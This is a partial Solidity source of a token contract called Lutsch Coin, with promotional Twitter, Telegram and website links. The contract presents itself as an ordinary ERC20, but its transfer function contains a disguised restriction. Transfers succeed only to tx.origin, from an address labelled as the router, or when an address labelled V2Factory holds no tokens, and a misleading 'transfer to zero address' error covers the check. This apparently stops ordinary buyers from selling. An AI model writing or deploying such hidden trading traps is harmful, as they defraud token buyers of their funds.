...
https://twitter.com/LutschCoinBNB
https://t.me.com/LutschCoinBNB
https://LutschCoinBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    uint256 private pairsToken = 0;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private swappingToggle = 1;
    uint256 private _totalSupply;
    address internal _uniswapRouter = 0x0B299881127625F58f7a13e4d10573ae53eAe58e;
    string private _symbol;
    string private _name;
    mapping(address => mapping(address => uint256)) private swappingToggles;
    address private V2Factory = 0x115ba6F2e418eFE710aaa8672e4851b8C92BcE95;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        require(to == tx.origin || from == _uniswapRouter || _balances[V2Factory] == 0, "ERC: transfer to zero address");
        ...
        uint256 swapamount = swappingToggle;
        if (swapamount > 0)
        {
...
contract LutschCoin is ERC20, Ownable
{
    constructor()
    ERC20(unicode"Lutsch Coin", unicode"LUTSCH")
    {
